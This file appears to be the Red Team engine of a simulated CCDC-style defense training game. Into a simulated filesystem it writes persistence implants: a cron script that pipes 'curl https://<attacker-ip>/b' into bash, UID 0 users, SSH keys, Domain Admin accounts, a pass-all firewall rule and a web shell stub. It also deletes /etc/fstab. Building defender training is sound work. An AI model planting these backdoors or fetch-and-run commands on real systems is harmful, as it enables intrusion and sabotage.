// The Red Team. Not a checklist of waves: it works the boxes from drop flag to the end, on the timeline Midwest
// red teams describe. Quiet until lunch (get in, plant persistence), recoverable takedowns from lunch, destructive
// after 14:30. Everything it does changes the box, so the player finds it with ordinary tools and the scoring
// engine sees the damage. Remove a backdoor but leave the way in open and it comes back.
//
// Ways in, per box:
//   open findings and accounts still on a default or weak password.
//   path 'beacon' calls out, so the edge firewall does not stop it.
//   path 'web' arrives over a scored port, so the edge firewall does not stop it either.
//   path 'mgmt' (SSH, RDP, SMB, DB) needs an open edge OR a foothold on another internal box (lateral movement).
//   path 'local' needs a foothold on that box already.

import { hash01 } from './ccdcHash.js';
import { AUTH_KEYS, AUTH_LOG, PASSWD, dirOf, weakAccounts } from './ccdcBox.js';

export const RED_POOL = 200;
export const FINDING_POOL = 140;
export const OPS = 28; // Red Team actions per round, whatever its length
export const TAKEDOWN_FROM = 12; // game hour
export const DESTROY_FROM = 14.5;
const PTS = { creds: 8, persist: 3, takedown: 8, destroy: 15, reentry: 5, edge: 10 };

const LINUX_NAMES = ['apt-compat2', 'dbus-sync', 'logrotated', 'snap-refreshd', 'motd-news2', 'pkgcache'];
const LINUX_USERS = ['sysbackup', 'ansible2', 'nagios1', 'support'];
const WIN_TASKS = ['MicrosoftEdgeUpdateCore2', 'OneDriveStandaloneSync', 'WindowsDefenderCacheCheck', 'AdobeGCInvoker'];
const WIN_USERS = ['svc_monitor', 'helpdesk2', 'scan_admin', 'svc_wsus'];
const WIN_RUN = ['OneDriveHelper', 'RealtekAudioSvc', 'SyncHost'];

export function gameHour(state, sec) { return 9 + (sec * (state.timeScale || 28)) / 3600; }

/** 'HH:MM' on the competition clock for a sim-seconds value. */
export function gameTime(state, sec) {
  const t = 9 * 3600 + Math.floor(sec * (state.timeScale || 28));
  return `${String(Math.floor(t / 3600)).padStart(2, '0')}:${String(Math.floor((t % 3600) / 60)).padStart(2, '0')}`;
}

const seedOf = (state) => {
  const s = state.seed;
  if (typeof s === 'number') return s | 0;
  let x = 7; for (const c of String(s)) x = Math.imul(x, 31) + c.charCodeAt(0) | 0;
  return x;
};

export function attachRed(state, ip) {
  const limit = state.timeLimitSec || state.scenario.clockSeconds || 900;
  const sum = state.findingList.reduce((n, f) => n + (f.exploitable ? f.compromise?.penalty || 40 : 0), 0) || 1;
  state.engine.red = {
    ip: ip || `203.0.113.${40 + Math.floor(hash01(seedOf(state), 90) * 180)}`,
    every: limit / OPS, next: limit / OPS / 2, n: 0, seq: 0,
    access: {}, used: {}, implants: [], events: [], lastHit: {}, findingWeight: FINDING_POOL / sum,
  };
}

const roll = (state, r, tag) => hash01(seedOf(state), 91, r.n, tag, r.seq++);
const pick = (state, r, list, tag) => list[Math.floor(roll(state, r, tag) * list.length)];

function record(state, r, sec, ev) {
  const e = { id: r.events.length + 1, at: sec, src: r.ip, recovered: 0, keywords: [], ...ev };
  r.events.push(e);
  state.engine.events.push({ at: sec, cls: 'redop', text: `Red Team (${e.src}) on ${e.host}: ${e.text}` });
  return e;
}

// ---- reachability --------------------------------------------------------------------------------------------

function edgeClosed(state) {
  const f = state.findingList.find((x) => x.fw);
  return !!f && state.findings[f.id].status === 'fixed';
}

function vectorsOf(state, dev) {
  const ds = state.devState[dev.id];
  const out = [];
  for (const f of state.findingList) {
    if (f.host !== dev.id || f.fw || !f.exploitable || state.findings[f.id].status === 'fixed') continue;
    out.push({ key: `f:${f.id}`, kind: 'finding', finding: f, path: f.path || 'mgmt' });
  }
  for (const name of weakAccounts(dev, ds)) out.push({ key: `c:${dev.id}:${name}`, kind: 'creds', account: name, path: 'mgmt' });
  return out;
}

function reachable(state, r, dev, v) {
  if (state.devState[dev.id]?.live?.bricked) return false;
  if (v.path === 'beacon' || v.path === 'web') return true;
  if (v.path === 'local') return !!r.access[dev.id];
  if (!edgeClosed(state)) return true;
  return Object.keys(r.access).some((id) => id !== dev.id && state.deviceList.find((d) => d.id === id)?.kind !== 'firewall');
}

// ---- persistence ----------------------------------------------------------------------------------------------

/** Is this backdoor still on the box? Checked against the box itself, so any way of removing it counts. */
export function implantAlive(state, im) {
  const dev = state.deviceList.find((d) => d.id === im.dev);
  const ds = state.devState[im.dev];
  const L = ds.live;
  switch (im.kind) {
    case 'file': return ds.fs[im.path] !== undefined;
    case 'key': return (ds.fs[AUTH_KEYS] || '').includes(im.artifact);
    case 'user': return new RegExp(`^${im.artifact}:`, 'm').test(ds.fs[PASSWD] || '') && !ds.creds[im.artifact]?.locked;
    case 'task': return L.tasks.some((t) => t.TaskName === im.artifact && t.State !== 'Disabled');
    case 'localuser': return L.localUsers.some((u) => u.Name === im.artifact && u.Enabled);
    case 'aduser': { const u = dirOf(dev, ds)?.lookup(im.artifact); return !!u && u.enabled !== false && u.memberOf.includes('Domain Admins'); }
    case 'runkey': return L.runKeys.some((k) => k.name === im.artifact);
    case 'fwrule': return ds.firewall.rules.some((x) => x.from === im.artifact);
    default: return false;
  }
}

function addProc(ds, r, state, cmd) {
  const pid = 2000 + Math.floor(roll(state, r, 3) * 7000);
  ds.live.procs.push({ user: 'root', pid, cmd });
  ds.live.conns.push(`ESTAB  0  0  ${state.deviceList.find((d) => ds === state.devState[d.id]).ip}:${40000 + (pid % 20000)}  ${r.ip}:443  users:(("${cmd.split('/').pop()}",pid=${pid},fd=3))`);
}

function plantLinux(state, r, dev, ds, sec) {
  const tried = new Set(r.implants.filter((i) => i.dev === dev.id).map((i) => i.tag));
  const webroot = state.serviceList.find((s) => s.host === dev.id && s.content)?.content.file.replace(/\/[^/]*$/, '');
  const options = ['cron', 'key', 'user', 'unit', ...(webroot ? ['webshell'] : [])].filter((k) => !tried.has(k));
  if (!options.length) return null;
  const tag = pick(state, r, options, 1);
  const name = pick(state, r, LINUX_NAMES, 2);
  let im;
  if (tag === 'cron') {
    const bin = `/usr/lib/${name}/update`;
    ds.fs[`/etc/cron.d/${name}`] = `*/5 * * * * root ${bin} >/dev/null 2>&1\n`;
    ds.fs[bin] = `#!/bin/bash\ncurl -sk https://${r.ip}/b | bash\n`;
    addProc(ds, r, state, bin);
    im = { kind: 'file', path: `/etc/cron.d/${name}`, artifact: `/etc/cron.d/${name}`, text: `cron job /etc/cron.d/${name}` };
  } else if (tag === 'key') {
    const marker = `${name}@ops-${Math.floor(roll(state, r, 4) * 90 + 10)}`;
    ds.fs[AUTH_KEYS] = `${ds.fs[AUTH_KEYS] || ''}ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI${Math.floor(roll(state, r, 5) * 1e9)} ${marker}\n`;
    im = { kind: 'key', artifact: marker, text: `SSH key ${marker} in root's authorized_keys` };
  } else if (tag === 'user') {
    const user = pick(state, r, LINUX_USERS, 6);
    if (new RegExp(`^${user}:`, 'm').test(ds.fs[PASSWD])) return null;
    ds.fs[PASSWD] += `${user}:x:0:0:${user}:/root:/bin/bash\n`;
    ds.creds[user] = { pw: 'red', strong: true, def: false };
    im = { kind: 'user', artifact: user, text: `UID 0 account ${user}` };
  } else if (tag === 'unit') {
    const path = `/etc/systemd/system/${name}.service`;
    ds.fs[path] = `[Service]\nExecStart=/usr/local/sbin/${name}\nRestart=always\n[Install]\nWantedBy=multi-user.target\n`;
    ds.live.units[name] = 'active';
    addProc(ds, r, state, `/usr/local/sbin/${name}`);
    im = { kind: 'file', path, artifact: path, text: `systemd unit ${name}.service` };
  } else {
    const path = `${webroot}/.${name}.php`;
    ds.fs[path] = `<?php if(isset($_REQUEST['${name.slice(0, 3)}'])){ /* ${Math.floor(roll(state, r, 7) * 1e6)} */ } ?>\n`;
    im = { kind: 'file', path, artifact: path, text: `web shell ${path}` };
  }
  return { ...im, tag, dev: dev.id, at: sec };
}

function plantWindows(state, r, dev, ds, sec) {
  const tried = new Set(r.implants.filter((i) => i.dev === dev.id).map((i) => i.tag));
  const isDc = /domain controller/i.test(dev.name || '');
  const options = ['task', 'run', isDc ? 'aduser' : 'localuser'].filter((k) => !tried.has(k));
  if (!options.length) return null;
  const tag = pick(state, r, options, 1);
  let im;
  if (tag === 'task') {
    const name = pick(state, r, WIN_TASKS, 2);
    ds.live.tasks.push({ TaskPath: '\\', TaskName: name, State: 'Ready' });
    ds.live.procs.push({ user: 'SYSTEM', pid: 5000 + r.n, cmd: `${name}.exe` });
    im = { kind: 'task', artifact: name, text: `scheduled task ${name}` };
  } else if (tag === 'run') {
    const name = pick(state, r, WIN_RUN, 3);
    ds.live.runKeys.push({ name, cmd: `C:\\ProgramData\\${name}\\${name.toLowerCase()}.exe` });
    im = { kind: 'runkey', artifact: name, text: `Run key ${name}` };
  } else if (tag === 'aduser') {
    const name = pick(state, r, WIN_USERS, 4);
    const dir = dirOf(dev, ds);
    if (!dir || dir.lookup(name)) return null;
    dir.addUser({ sam: name, first: name, last: '', ou: 'Users', memberOf: ['Domain Admins'], created: 'redteam' });
    im = { kind: 'aduser', artifact: name, text: `Domain Admin account ${name}` };
  } else {
    const name = pick(state, r, WIN_USERS, 5);
    if (ds.live.localUsers.some((u) => u.Name === name)) return null;
    ds.live.localUsers.push({ Name: name, Enabled: true, Description: '' });
    ds.live.localAdmins.push({ ObjectClass: 'User', Name: `${dev.host.toUpperCase()}\\${name}`, PrincipalSource: 'Local' });
    ds.creds[name] = { pw: 'red', strong: true, def: false };
    im = { kind: 'localuser', artifact: name, text: `local admin account ${name}` };
  }
  return { ...im, tag, dev: dev.id, at: sec };
}

function plant(state, r, dev, ds, sec) {
  const im = dev.kind === 'bash' ? plantLinux(state, r, dev, ds, sec) : plantWindows(state, r, dev, ds, sec);
  if (!im) return false;
  r.implants.push(im);
  record(state, r, sec, { type: 'persist', host: dev.id, artifact: im.artifact, text: `planted ${im.text}.`, charged: PTS.persist, implant: im, keywords: [im.artifact] });
  return true;
}

// ---- impact ---------------------------------------------------------------------------------------------------

function takedown(state, r, dev, ds, svc, sec) {
  const L = ds.live;
  const options = [];
  if (svc.units?.length) options.push('stop', 'iptables');
  if (svc.winServices?.length) options.push('winstop');
  if (svc.content) options.push('deface');
  const how = pick(state, r, options, 8);
  let text; let artifact;
  if (how === 'stop') { L.units[svc.units[0]] = 'inactive'; artifact = svc.units[0]; text = `stopped ${artifact}.`; }
  else if (how === 'winstop') { const s = L.winServices.find((x) => x.Name === svc.winServices[0]); s.Status = 'Stopped'; artifact = s.Name; text = `stopped the ${artifact} service.`; }
  else if (how === 'iptables') { const port = svc.ports[0]; L.ipt.rules.unshift({ dport: String(port), src: null, proto: 'tcp', target: 'DROP' }); artifact = `dport ${port}`; text = `added an iptables DROP for port ${port}.`; }
  else { ds.fs[svc.content.file] = `<html><h1>owned by ${r.ip}</h1></html>\n`; artifact = svc.content.file; text = `defaced ${artifact}.`; }
  record(state, r, sec, { type: 'takedown', host: dev.id, artifact, text, charged: PTS.takedown, keywords: [artifact, svc.id] });
}

function destroy(state, r, dev, ds, svc, sec) {
  const L = ds.live;
  if (dev.kind === 'bash' && roll(state, r, 9) < 0.3) {
    delete ds.fs['/etc/fstab'];
    L.bricked = true;
    L.offlineUntil = Infinity;
    record(state, r, sec, { type: 'destroy', host: dev.id, artifact: '/etc/fstab', text: 'deleted /etc/fstab and rebooted the box.', charged: PTS.destroy, keywords: ['/etc/fstab', 'fstab'] });
    return;
  }
  if (svc.files?.length) {
    const victim = pick(state, r, svc.files, 10);
    delete ds.fs[victim];
    record(state, r, sec, { type: 'destroy', host: dev.id, artifact: victim, text: `deleted ${victim}.`, charged: PTS.destroy, keywords: [victim] });
    return;
  }
  if (svc.winServices?.length) {
    const s = L.winServices.find((x) => x.Name === svc.winServices[0]);
    s.Status = 'Stopped'; s.StartType = 'Disabled';
    record(state, r, sec, { type: 'destroy', host: dev.id, artifact: s.Name, text: `stopped and disabled the ${s.Name} service.`, charged: PTS.destroy, keywords: [s.Name] });
    return;
  }
  takedown(state, r, dev, ds, svc, sec);
}

function act(state, r, dev, sec) {
  const ds = state.devState[dev.id];
  if (dev.kind === 'firewall') {
    if (!r.implants.some((i) => i.dev === dev.id && implantAlive(state, i))) {
      ds.firewall.rules.unshift({ action: 'pass', proto: 'any', dst: 'any', port: 'any', from: r.ip });
      const im = { kind: 'fwrule', artifact: r.ip, tag: 'rule', dev: dev.id, at: sec };
      r.implants.push(im);
      record(state, r, sec, { type: 'persist', host: dev.id, artifact: r.ip, text: `added a WAN pass rule for ${r.ip}.`, charged: PTS.edge, implant: im, keywords: [r.ip] });
    }
    return;
  }
  if (ds.live.bricked || ds.live.offlineUntil > sec) return;
  const alive = r.implants.filter((i) => i.dev === dev.id && implantAlive(state, i)).length;
  const hour = gameHour(state, sec);
  if (hour < TAKEDOWN_FROM || alive < 1) { if (alive < 2) plant(state, r, dev, ds, sec); return; }
  const up = state.serviceList.filter((s) => s.host === dev.id && state.services[s.id]?.state === 'up');
  const cooled = (r.lastHit[dev.id] ?? -99) <= r.n - 2;
  if (!up.length || !cooled) { if (alive < 3) plant(state, r, dev, ds, sec); return; }
  const svc = pick(state, r, up, 11);
  r.lastHit[dev.id] = r.n;
  if (hour >= DESTROY_FROM && roll(state, r, 12) < 0.5) destroy(state, r, dev, ds, svc, sec);
  else takedown(state, r, dev, ds, svc, sec);
}

// ---- one Red Team operation -----------------------------------------------------------------------------------

function runOp(state, sec) {
  const r = state.engine.red;
  r.n += 1;
  // Who still has a way back in? Access lasts while a backdoor lives on the box.
  for (const dev of state.deviceList) {
    const ds = state.devState[dev.id];
    if (ds.live) {
      const aliveCmds = r.implants.filter((i) => i.dev === dev.id && implantAlive(state, i)).map((i) => i.artifact.split('/').pop());
      ds.live.procs = ds.live.procs.filter((p) => aliveCmds.some((a) => p.cmd.includes(a)));
      if (!aliveCmds.length) { ds.live.conns = []; ds.live.sessions = []; }
    }
    if (r.access[dev.id] && !r.implants.some((i) => i.dev === dev.id && implantAlive(state, i))) {
      const stillOpen = vectorsOf(state, dev).some((v) => r.used[v.key] && reachable(state, r, dev, v));
      if (!stillOpen) delete r.access[dev.id];
    }
  }
  // Get in somewhere new.
  const candidates = [];
  for (const dev of state.deviceList) for (const v of vectorsOf(state, dev)) if (!r.used[v.key] && reachable(state, r, dev, v)) candidates.push({ dev, v });
  if (candidates.length && roll(state, r, 20) < 0.7) {
    const { dev, v } = pick(state, r, candidates, 21);
    r.used[v.key] = true;
    r.access[dev.id] = true;
    const ds = state.devState[dev.id];
    if (v.kind === 'finding') {
      const f = v.finding;
      record(state, r, sec, { type: 'foothold', host: dev.id, findingId: f.id, title: f.title, impact: f.compromise?.impact || 'Compromised.', text: `got in through: ${f.title}.`, charged: Math.max(1, Math.round((f.compromise?.penalty || 40) * r.findingWeight)), keywords: [f.category, f.title, ...(f.keywords || [])].filter(Boolean).map(String) });
    } else {
      record(state, r, sec, { type: 'foothold', host: dev.id, account: v.account, title: `Weak password on ${v.account}@${dev.host}`, impact: 'Red Team logged in with a default or weak password.', text: `logged in as ${v.account} with a default or weak password.`, charged: PTS.creds, keywords: [v.account] });
      if (ds.live && ds.fs) {
        ds.fs[AUTH_LOG] += `sshd[${1000 + r.n}]: Accepted password for ${v.account} from ${r.ip} port ${40000 + r.n} ssh2\n`;
        ds.live.sessions.push(`${v.account}  pts/7        2026-10-31 09:${String(10 + r.n).padStart(2, '0')} (${r.ip})`);
      }
    }
  }
  // Re-enter a box you were pushed off, through a door that is still open.
  for (const dev of state.deviceList) {
    if (r.access[dev.id]) continue;
    const back = vectorsOf(state, dev).find((v) => r.used[v.key] && reachable(state, r, dev, v));
    if (back) { r.access[dev.id] = true; record(state, r, sec, { type: 'reentry', host: dev.id, text: `came back in after being evicted.`, charged: PTS.reentry, keywords: back.finding ? [back.finding.title] : [back.account] }); }
  }
  // Work the boxes it holds.
  const held = state.deviceList.filter((d) => r.access[d.id]);
  for (let k = 0; k < 2 && held.length; k++) act(state, r, held.splice(Math.floor(roll(state, r, 22 + k) * held.length), 1)[0], sec);
}

/** Run every Red Team operation due by `sec`. */
export function redAdvance(state, sec) {
  const r = state.engine?.red;
  if (!r) return;
  while (r.next <= sec) { runOp(state, r.next); r.next += r.every; }
}

/** Points Red Team has taken, after anything won back through incident reports. Capped at the Red Team pool. */
export function redCharged(state) {
  const r = state.engine?.red;
  if (!r) return 0;
  return r.events.reduce((n, e) => n + Math.max(0, e.charged - e.recovered), 0);
}

/** Forget what Red Team held on a box that has just been reverted. */
export function redForgetBox(state, devId) {
  const r = state.engine?.red;
  if (!r) return;
  delete r.access[devId];
  r.implants = r.implants.filter((i) => i.dev !== devId);
  for (const k of Object.keys(r.used)) if (k.startsWith(`c:${devId}:`)) delete r.used[k];
  for (const f of state.findingList) if (f.host === devId) delete r.used[`f:${f.id}`];
}

// ---- the same activity, as log lines for Splunk ----------------------------------------------------------------

/** Log specs (see siemGen) for one Red Team event, so it can be found by searching. */
export function redLogSpecs(state, ev, epoch) {
  const dev = state.deviceList.find((d) => d.id === ev.host);
  if (!dev || dev.kind === 'firewall') return [];
  const port = 40000 + (ev.id * 37) % 20000;
  const authBase = { src_port: port, pid: 1000 + ev.id, dest_port: 22, app: 'sshd', process: 'sshd', action: 'success' };
  if (dev.kind === 'bash') {
    const out = [];
    if (ev.type === 'foothold' && ev.account) out.push({ t: epoch, kind: 'auth', sub: 'accepted_pw', host: dev.host, fields: { ...authBase, src_ip: ev.src, user: ev.account } });
    if (ev.artifact) out.push({ t: epoch, kind: 'auth', sub: 'sudo', host: dev.host, fields: { ...authBase, src_ip: '', dest_port: '', app: 'sudo', process: 'sudo', user: 'root', tty: 'pts/7', pwd: '/root', command: `/usr/bin/tee ${ev.artifact}  # from ${ev.src}` } });
    return out;
  }
  const win = (code, extra) => ({ t: epoch, kind: 'win', host: dev.host, fields: { EventCode: code, action: 'success', dest: dev.host, user: ev.account || 'Administrator', Account_Name: ev.account || 'Administrator', Logon_Type: 3, src_ip: ev.src, src_port: port, Workstation_Name: 'KALI', ...extra } });
  const out = [win(4624)];
  if (ev.implant?.kind === 'aduser' || ev.implant?.kind === 'localuser') out.push(win(4720, { Target_Account_Name: ev.artifact, Subject_Account_Name: 'Administrator', Subject_Account_Domain: dev.host }));
  return out;
}
